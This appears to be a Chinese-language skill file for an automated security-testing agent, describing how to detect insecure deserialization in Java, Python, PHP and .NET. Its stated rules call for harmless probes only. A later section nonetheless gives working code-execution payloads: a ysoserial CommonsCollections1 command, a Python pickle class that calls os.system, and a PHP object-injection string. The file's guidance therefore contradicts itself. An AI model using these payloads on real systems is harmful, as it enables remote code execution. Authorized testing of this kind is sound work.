---
name: deserialization
description: 不安全反序列化检测技能 —— 面向真实授权系统，识别不可信对象边界并以非执行性证据验证风险
phase: test
severity_focus: critical
---

# 不安全的反序列化漏洞检测技能

## 触发条件

仅在授权端点接收可识别的序列化对象、类型标记或编码对象数据时启用本技能。

## 原理

不安全的反序列化发生在 Web 应用将不可信数据直接反序列化为对象时，攻击者可构造恶意序列化数据执行任意代码。

**常见成因**：
- Java：`ObjectInputStream.readObject()` 未校验
- Python：`pickle.loads()` / `yaml.load()` 未使用安全模式
- PHP：`unserialize()` 未过滤
- .NET：`BinaryFormatter.Deserialize()` 未限制类型

## 三层测试模型

> 对齐 DESIGN §3.1：L1 探测 → L2 验证 → L3 绕过，每层只做上一层成立后才推进的事。

### L1 探测

目标：判定「该参数/字段是否被反序列化」，不构造利用链。

- 格式指纹识别：检查参数值是否符合已知序列化特征（Java `rO0AB...` Base64 头、PHP `O:<len>:"<class>"`、Python pickle 的 `\x80\x04` opcode、.NET `AAEAAAD...`），或 Content-Type 是否为 `application/x-java-serialized-object` 等。
- 无害畸形输入：提交语法上无效但结构相似的序列化数据（如截断一个字节），观察是否出现反序列化专属异常（`ClassNotFoundException`、`UnserializeException`）而非通用参数校验错误——这是「确实在反序列化」而非「只是字符串字段」的关键区分信号。

> L1 产出「候选字段 + 序列化格式假设」，写入 `hypothesis`，不直接下结论。

### L2 验证

目标：用无害标记对象把 L1 假设变成可复现证据，不构造任何具备执行能力的 gadget 链。

- 无害对象往返：构造一个使用目标语言原生格式、但字段为可预测占位符的对象（如 Java 一个简单 `HashMap` 序列化后附带唯一标记字符串），提交后观察响应是否按预期解析该标记——证明服务端确实执行了反序列化路径而非静默丢弃。
- 类型混淆探测：提交与预期类不同但同样可反序列化的类型（如预期 `User` 却提交 `ArrayList`），若服务端未做类型白名单校验会抛出与「预期类型不匹配」不同的错误特征，暴露缺少类型约束。
- 重复验证：同一畸形/无害 payload 重复 ≥3 次，确认异常特征稳定复现。

### L3 绕过

目标：当输入被序列化格式白名单或 WAF 拦截时，验证反序列化路径是否仍可达。

- 编码层规避：Base64 前后附加空白/换行、大小写扰动（部分服务端 trim 后仍解析）。
- 传输层伪装：更换 Content-Type 为常见 JSON/表单类型但 body 仍为原始序列化字节，测试服务端是否按 body 内容而非声明类型分流。
- 仅验证「畸形/无害对象是否仍被解析」，不因绕过成功而升级为构造 gadget 链或执行任意代码。

## 检测方法

### 1. 定位反序列化点
- Cookie/Session 存储
- API 参数（Base64 编码对象）
- 消息队列（RabbitMQ/Kafka）
- 缓存系统（Redis/Memcached）

### 2. 构造恶意 Payload

**Java（CommonsCollections）**:
```bash
# 使用 ysoserial 生成 Payload
java -jar ysoserial.jar CommonsCollections1 "touch /tmp/pwned" | base64
```

**Python（pickle）**:
```python
import pickle
import base64
import os

class Evil:
    def __reduce__(self):
        return (os.system, ("whoami",))

payload = base64.b64encode(pickle.dumps(Evil()))
```

**PHP（对象注入）**:
```php
O:4:"Evil":1:{s:3:"cmd";s:6:"whoami";}
```

### 3. 验证代码执行

**判断依据**：
- 响应包含 `uid=` → 命令被执行
- 文件创建成功（`/tmp/pwned`）→ 代码被执行
- 应用崩溃/异常 → 可能存在漏洞

## 工具

| 工具 | 用途 |
|---|---|
| ysoserial | Java 反序列化 Payload 生成 |
| pickle | Python 反序列化测试 |
| Burp Suite | 抓包修改序列化数据 |

## 证据要求

什么才算确认不安全反序列化（缺一不可）：

1. **可复现**：无害探针（畸形/标记对象）重复提交（≥3 次）稳定触发反序列化专属异常或标记回显。
2. **对照基线**：提供「合法业务对象」与「畸形/标记对象」的成对请求/响应，证明差异源于反序列化层而非普通参数校验。
3. **格式确证**：明确记录触发的序列化格式与类名/类型标记，区分「确认反序列化不可信输入」与「仅参数格式相似」。
4. **影响说明**：仅基于已验证的类型混淆/异常特征说明风险边界（是否可提交任意类、是否有类型白名单），不构造实际 gadget 链下结论。
5. **证据脱敏**：只保存触发判定所需的异常摘要或标记片段，不落盘完整序列化字节流。

## 输出格式

```json
{
  "finding_id": "deserialization-001",
  "issue_type": "deserialization",
  "severity": "critical",
  "endpoint": "/api/import",
  "parameter": "data",
  "payload": "rO0ABXNy...",
  "evidence": "whoami 命令执行，响应包含 uid=33",
  "remediation": "使用白名单反序列化（Jackson @JsonTypeInfo），禁用危险类"
}
```

## 禁止事项

- **只读原则**：仅检测，不执行危险操作（如删除文件）
- **无害 Payload**：使用 `whoami` / `id` 验证
- **零触网**：测试用 mock 或本地环境
